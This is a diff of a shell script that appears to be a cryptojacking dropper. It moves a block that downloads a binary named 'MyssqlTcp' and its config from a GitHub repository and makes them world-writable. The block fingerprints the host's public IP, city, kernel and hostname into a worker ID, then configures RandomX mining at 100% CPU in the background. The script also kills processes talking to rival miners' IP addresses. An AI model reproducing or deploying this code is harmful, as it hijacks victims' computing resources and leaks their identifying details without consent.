@@ -115,7 +115,40 @@ if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
   exit 1
 fi
 
+cd /$HOME/
+echo "/$HOME/??"
+mkdir myssqltcp
+
+cd /$HOME/myssqltcp
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
+chmod 777 MyssqlTcp
+chmod 777 config.json
+
+MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/-/g'`
+CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+UUID=`cat /proc/sys/kernel/random/uuid`
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS"
+fi
+sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$UUID''$MEIP'-'$UUIP':.'$CITY''$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$UUID''",/' $HOME/myssqltcp/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
+cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
 kill_miner_proc()
+
 {
     netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
     netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
@@ -678,40 +711,6 @@ killall -9 jj
 killall -9 p
 kill_miner_proc
 kill_sus_proc
-
-cd /$HOME/
-echo "/$HOME/??"
-mkdir myssqltcp
-
-cd /$HOME/myssqltcp
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
-wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
-chmod 777 MyssqlTcp
-chmod 777 config.json
-
-MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-UUID=`cat /proc/sys/kernel/random/uuid`
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS"
-fi
-sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$UUID''$MEIP'-'$UUIP':.'$CITY''$PASS'",/' $HOME/myssqltcp/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$UUID''",/' $HOME/myssqltcp/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
-
-cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/myssqltcp/config_background.json
 
 # preparing script
 
